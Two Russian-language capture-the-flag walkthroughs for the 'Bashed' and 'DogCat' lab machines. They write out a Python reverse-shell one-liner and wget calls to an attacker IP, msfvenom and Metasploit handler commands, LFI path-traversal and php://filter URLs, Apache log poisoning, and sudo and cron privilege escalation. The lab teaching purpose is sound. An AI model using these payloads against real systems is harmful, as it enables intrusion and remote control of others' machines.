

# Bashed

**Плошадка:** https://hackthebox.com
**Уровень:** Medium
**Задача:** Найти файлы **user.txt** и **root.txt**

Привет друзья! Сегодня мы будем решать задачу «Bashed», которая проводится в формате CTF-конкурса (capture the flag – захватить флаг). Эта лабораторная работа создана на платформе Hack the Box. На базе этой онлайн-платформы разработано множество других лабораторных работ, решая которые, вы можете прокачать свои навыки пентестера. Есть задачи и для начинающих и для продвинутых специалистов. Задача Bashed относится к категории «Retired Lab».

Начнем!

## Разведка

## Сканирование

Поскольку с этими задачами можно работать только онлайн, доступен статический IP-адрес. У лабораторной работы Bashed адрес - 10.10.10.68.

Как обычно, начинаем со сканирования портов.

```
nmap -A 10.10.10.68
```

![[Pasted image 20230704133215.png]]

Поскольку 80-й порт открыт, попробуем ввести этот IP в адресной строке браузера. В результате появилась страница, показанная на рисунке ниже.

![[Pasted image 20230704133242.png]]

## Поиск скрытых папок

Затем воспользуемся утилитой dirb из набора в Kali Linux для получения списка директорий. В результате нашлось несколько интересных папок, в том числе /dev.

![[Pasted image 20230704133422.png]]

Если открыть директорию /dev через браузер, можно найти ссылку на файл phpbash.php. Кликаем на эту ссылку.

![[Pasted image 20230704133440.png]]

В результате произойдет перенаправление на страницу, показанную на рисунке ниже, которая, похоже, представляет собой веб-шелл.

Теперь вы можете тестировать произвольные команды. Например, попробуем ввести команду ls для просмотра содержимого текущей директории:

![[Pasted image 20230704133602.png]]

Внутри директории /html находится папка uploads. Таким образом, мы можем легко скомпрометировать целевую систему, загрузив бэкдор.

![[Pasted image 20230704133634.png]]

## Создание обратной оболочки

При помощи утилиты msfvenom мы создали вредоносный файл shell.php, используя следующую команду:

```
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.28 lport=4444 -f raw
```

Одновременно запускаем multi/handler для обратного соединения с компьютера жертвы:

![[Pasted image 20230704133818.png]]
![[Pasted image 20230704133826.png]]

Для передачи файла мы использовали простейший Python HTTP-сервер. Вы также можете использовать альтернативный метод для передачи и загрузки вредоносного файла через wget в директорию uploads.

## Загрузка обратной оболочки

![[Pasted image 20230704133927.png]]

Теперь запускаем вредоносный файл shell.php через браузер, как показано на рисунке ниже, и переключаемся на Metasploit Framework для обратного соединения.

## Запуск обратной оболочки

![[Pasted image 20230704134140.png]]

После запуска бэкдора переходим в Metaslploit Framework и ожидаем сессию в meterpreter.

```bash
msf use exploit/multi/handler
msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 10.10.14.28
msf exploit(multi/handler) set lport 4444
msf exploit(multi/handler) exploit
```

На рисунке ниже показана сессия meterpreter session1, которая используется для доступа к tty-шеллу на компьютере жертвы.

Теперь переходим к решению нашей задачи, а конкретно – к получению содержимого файлов user.txt и root.txt. Вначале посмотрим содержимое директории /home.

```bash
cd home
ls
```

Внутри папки home находится директория arrexel, в которой находится файл user.txt. Для просмотра содержимого файла user.txt используем команду cat. 

```bash
cd arrexel
ls
cat user.txt
```

Прекрасно! Первая часть задачи решена.

![[Pasted image 20230704135545.png]]

Для создания еще одного экземпляра tty-шелла на целевой системе нам нужно импортировать python-файл. Я запустил следующую команду внутри meterpreter-сессии.

```
shell
python -c 'import pty;pty.spawn("/bin/bash")'
lsb_release -a
```

![[Pasted image 20230704135621.png]]

Запускаем команду ls -al command для просмотра прав доступа всех директорий. Замечаем, что пользователь scriptmanager имеет права для доступа к директории /scripts.

![[Pasted image 20230704140034.png]]
![[Pasted image 20230704140045.png]]

Если мы попытаемся зайти в директорию /scriptsот имени обычного пользователя, появится сообщение «Permission Denied». 

Запускаем команду run sudo –l, которая сообщит нам, что у пользователя scriptmanager отсутствует пароль.

Затем запускаем следующие команды от имени пользователя scriptmanager:

```bash
sudo -u scriptmanager ls /scripts
sudo -u scriptmanager cat /scripts/test.py
sudo -u scriptmanager cat /scripts/test.txt
```

Поскольку мы нашли python-файл, нужно заменить оригинальный test.py на вредоносный python-файл для создания обратного соединения через netcat. Для начала нужно сохранить следующий код в текстовом файле:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",1234));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Сохраняем файл с расширением .py, загружаем в систему жертвы и запускаем netcat на порту, где происходит прослушивание.

**Примечание:** Замените адрес 10.10.14.28 внутри кода на ваш VPN IP.

![[Pasted image 20230704140412.png]]

Теперь загружаем вредоносный файл в директорию /tmp.

```bash
wget http://10.10.14.28/root.py
```

А затем заменяем файл test.py в директории /script на файл root.py с помощью следующей команды:

```bash
sudo -u scriptmanager cp /tmp/root.py /scripts/test.py
```

Через некоторое время появится обратное соединение в терминале, где запущен netcat, с правами суперпользователя. Завершаем задачу просмотром содержимого файла root.txt.

```
nc -lvp 1234
id
cd /root
ls
cat root.txt
```

![[Pasted image 20230704140813.png]]

Второй метод нахождения файла root.txt

Мы выяснили, что система жертвы работает на базе Ubuntu 16.04. В Гугле находим эксплоит, позволяющий получить права суперпользователя на уровне ядра. 

Сохраняем текст эксплоита в файле poc.c.

![[Pasted image 20230704140906.png]]

Компилируем файл при помощи следующей команды: 

```
gcc poc.c -o pwn
```

Запускаем Python HTTP-сервер для передачи файла на целевую систему.

![[Pasted image 20230704140930.png]]

Наконец, загружаем скомпилированный файл pwn на целевую машину при помощи wget в директорию /dev/shm, устанавливаем права доступа и запускаем эксплоит.

```
wget http://10.10.14.28/pwn
```


---

# DogCat

Сегодня мы собираемся решить еще одну задачу boot2root под названием «DogCat». Он доступен на TryHackMe для практики тестирования на проникновение. Эта лаборатория средней сложности, если у нас есть необходимые базовые знания, чтобы сломать лаборатории, и мы внимательны ко всем деталям, которые мы находим во время разведки. 

**Уровень:** Medium
**Плошадка:** https://tryhackme.com

## Введение

Чтобы прочитать и понять, что такое машина, мы начнем с чтения описания лаборатории:

«Я сделал сайт, где можно посмотреть фотографии собак и/или кошек!
Эксплуатируйте PHP-приложение через [[LFI_and_RFI | LFI]]  и вырывайтесь из контейнера докеров».

После загрузки машины со страницы TryHackMe: DogCat нам будет предоставлен целевой IP-адрес.

```
IP-адрес: 10.10.69.30
```

В этой комнате есть 4 флага, которые нам нужно найти, чтобы собрать Машину.

## Разведка

## Сканировние 

Мы начнем со сканирования nmap с параметром -sC для сценариев по умолчанию и -sV для версий сканирования.

```
nmap -sC -sV 10.10.69.30
```

![[Pasted image 20230705133206.png]]

Nmap Scan дает нам 2 сервиса для перечисления. Он предоставил нам службу SSH на порту 22, но, к сожалению, у нас нет набора учетных данных для доступа к машине через SSH. Далее у нас есть служба HTTP на порту 80, с которой мы и начнем наше перечисление.

Поскольку у нас запущена служба HTTP, полезно проверить веб-страницу, размещенную с помощью веб-браузера. Нам задают вопрос. Что мы хотели бы видеть. Будучи любителями собак, мы выбрали собаку. Это дало нам такие милые изображения собак, что я чуть не пропустил изменения URL и параметр просмотра со значением собаки.

```
http://10.10.69.30/?view=dog
```

![[Pasted image 20230705133312.png]]

## Анализ уязвимости

Чисто инстинктивно казалось, что этот параметр можно вводить. Перепробовал кучу разных нагрузок. Потом наконец добрался до [[LFI_and_RFI | LFI]]. Когда мы пытаемся просмотреть файл etc/passwd. Это дает нам ошибку, что только собаки и кошки разрешены в качестве значения параметра просмотра.

```
http://10.10.69.30/?view=../../../../../etc/passwd
```

![[Pasted image 20230705133410.png]]

Казалось, что есть какое-то ограничение. Чтобы обойти это ограничение, мы попытались предоставить обёртку php-фильтра. Его можно найти в GitHub PayloadsAllTheThings . Возьмите фильтр и перенастройте его для работы на нашей целевой машине.


![[Pasted image 20230705133440.png]]

Когда мы попытались получить доступ к странице собаки через оболочку, она возвращает строку в кодировке Base64. Который при декодировании возвращает php-код для этого конкретного файла.

```
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

Это означает, что на сервере есть 10 фотографий собак, и изображения выбираются случайным образом.

```
http://10.10.69.30/?view=php://filter/convert.base64-encode/resource=dog
```

![[Pasted image 20230705133823.png]]

Теперь, когда мы можем прочитать содержимое dog.php, мы можем использовать ту же технику для чтения index.php или главной страницы. Мы делаем это, чтобы прочитать код и понять, как работает index.php. Опять же, нам предоставляется строка в кодировке Base64. Он становился довольно большим для нормального отображения. Следовательно, переключился на просмотр исходного кода.

![[Pasted image 20230705133909.png]]

Декодируя в Clear Text, мы можем увидеть php-код страницы index.php. При ближайшем рассмотрении мы видим, что функция добавляет расширение .php в конце URL-адреса, поэтому, если мы укажем ключевое слово «собака», оно преобразует его в dog.php, и когда мы давали ему /etc/password он преобразовывал его в /etc/passwd.php, поэтому нам нужно избежать этой функции, чтобы читать
файлы по нашему выбору. 

```
echo "###Текст в кодировке Base64##" | base64 -d
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
```

![[Pasted image 20230705134008.png]]

Чтобы избежать расширения, мы добавим параметр, как показано на изображении ниже. Теперь, когда мы пытаемся прочитать файл /etc/passwd, он доступен напрямую. Мы успешно использовали включение локальных файлов.

```
http://10.10.69.30/?view=dog/../../../../../../../etc/passwd&ext=
```

![[Pasted image 20230705134051.png]]

## Эксплуатация

У нас есть уязвимость включения локальных файлов, и из сканирования nmap мы знаем, что работаем с сервером Apache. Давайте попробуем преобразовать эту уязвимость LFI в удаленное выполнение кода, если мы сможем отравить ее журналы. Мы написали подробное пошаговое руководство по отравлению журналов Apache через LFI. Вот и проскочим через это. Если вы хотите узнать
больше об этом. См. ссылку ниже.

**Отравление журнала Apache через LFI**

Сначала попробуем прочитать файл access.log с помощью LFI. Путь к файлу access.log — /var/log/apache2/access.log. Мы заменим наш /etc/passwd на это место, чтобы прочитать журнал.

```
http://10.10.69.30/?view=dog/../../../../../../../var/log/apache2/access.log&ext=
```

![[Pasted image 20230705162302.png]]

Здесь мы видим, что журнал доступен. Теперь пришло время отравить его. Для этого нам понадобится Burp Suite. Мы перехватим запрос с помощью Burp Suite. Затем мы будем манипулировать User-Agent. Мы можем видеть этот пользовательский агент по умолчанию на изображении ниже.

![[Pasted image 20230705162409.png]]

Мы меняем User-Agent, чтобы ввести php-код, который может вызывать системные переменные для запуска системных команд. Отправляем запрос на сервер.

![[Pasted image 20230705162440.png]]

Теперь мы объявим переменную c с помощью системных команд, чтобы проверить, работает ли она. Мы запустим команду whoami. Как мы можем заметить, ответ на нашу команду был виден внутри журналов. Команда, которую мы дали серверу, была запущена с использованием пользователя www-data.

```
http://10.10.69.30/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&c=whoami
```

![[Pasted image 20230705162512.png]]

Теперь, когда мы знаем, что можем выполнять команды, т. е. мы обновили нашу уязвимость, связанную с включением локальных файлов, до уязвимости, связанной с удаленным выполнением команд. Теперь мы можем использовать его для получения обратной оболочки на целевой машине. Для этого мы создадим полезную нагрузку на основе php, используя Metasploit Web Delivery Exploit. Для этого требуются основные данные, такие как локальный IP-адрес (обязательно укажите IP-адрес из VPN), локальный порт, srvport и т. д.

![[Pasted image 20230705162647.png]]

Metasploit создал полезную нагрузку в соответствии с нашими требованиями. Теперь нам нужно скопировать полезную нагрузку и заменить команду whoami из предыдущего шага этой полезной нагрузкой. См. команду, изображенную
ниже. 

```
http://10.10.69.30/?view=dog/../../../../../../../var/log/apache2/access.log
```

Это приведет к созданию обратной оболочки с целевой машины на нашу локальную машину в виде оболочки meterpreter, как показано на изображении ниже.

![[Pasted image 20230705162723.png]]

После того, как мы добрались до meterpreter, мы конвертируем в bash с помощью команды оболочки. Мы обнаружили, что для эффективного использования оболочки нам необходимо преобразовать ее в оболочку TTY. Итак, мы пробуем однострочник python, но на машине не установлен python. Затем мы используем базовую команду оболочки TTY. После этого мы запускаем команду whoami,
чтобы обнаружить, что у нас есть оболочка в качестве пользователя www-data. Мы перечисляем все файлы в текущем каталоге, чтобы найти файл flag.php. После прочтения этого файла мы получаем наш первый флаг.

![[Pasted image 20230705162838.png]]

Мы переходим в предыдущий каталог и перечисляем его содержимое, чтобы найти наш флаг 2.

![[Pasted image 20230705162919.png]]

## Повышение привилегий

У нас есть 2 флага, и теперь на этом пользовательском уровне перечислять больше нечего. Это означает, что теперь нам придется повысить наши привилегии до корневого уровня. Для этого мы начинаем наше перечисление, читая разрешения sudo для текущего пользователя. Это вернуло двоичный файл env. Это означает, что текущий пользователь может запускать двоичный файл env как пользователь root без пароля для root.

![[Pasted image 20230705170553.png]]

Env является частью GTFOBin, мы знаем это, потому что мы решили машину, которая имела аналогичный метод повышения привилегий. В поисках env на GTFOBin мы обнаруживаем, что все, что нам нужно сделать, это выполнить команду env как sudo с /bin/sh в качестве параметра.

![[Pasted image 20230705170639.png]]

Сделав это, мы быстро получим корневую оболочку. Пробуем искать флаг и находим на автомате Флаг 3.

![[Pasted image 20230705170707.png]]

Если мы помним описание машины в начале, мы знаем, что это экземпляр докера, работающий на машине. Последний флаг должен быть доступен после выхода из этого экземпляра. Заходим в корневой каталог и перечисляем его содержимое. Теперь мы можем подтвердить, что это действительно экземпляр докера. Мы начинаем перечислять обычные местоположения и наткнулись на каталог резервных копий в /opt. Каталог резервных копий содержал сжатый файл и сценарий оболочки. Прочитав сценарий оболочки, мы можем определить,
что он делает резервную копию запущенных веб-страниц в сжатый файл. Этот сценарий может периодически запускаться с использованием задания Cron. 

![[Pasted image 20230705170738.png]]

Мы используем команду echo, чтобы вставить команду вызова оболочки, указывающую на нашу локальную машину, в сценарий резервной копии  оболочки. Мы можем видеть, что наша команда вызова оболочки добавлена в сценарий оболочки на изображении, приведенном ниже.

![[Pasted image 20230705170806.png]]

Теперь мы запускаем прослушиватель на порту, указанном в команде вызова

оболочки, чтобы он мог получить сгенерированную обратную оболочку. Мы видим, что сеанс, который мы получили, является корневым на машине. Перечисляем содержимое, чтобы найти Четвертый и последний Флаг на Машине.

![[Pasted image 20230705170834.png]]

Эта машина была довольно интересной, и нам было очень весело ее решать.

Вещи, которые мы узнали, краткий обзор.

Перечисление параметров, обход PHP-фильтра с помощью Wrapper, чтение внутреннего кода, использование включения локального файла, обновление включения локального файла для удаленного выполнения кода, получение Meterpreter, повышение привилегий с помощью разрешений Sudo в env, экранирование контейнера Docker с помощью записываемого скрипта.

**Источник:** https://www.hackingarticles.in/

---
 
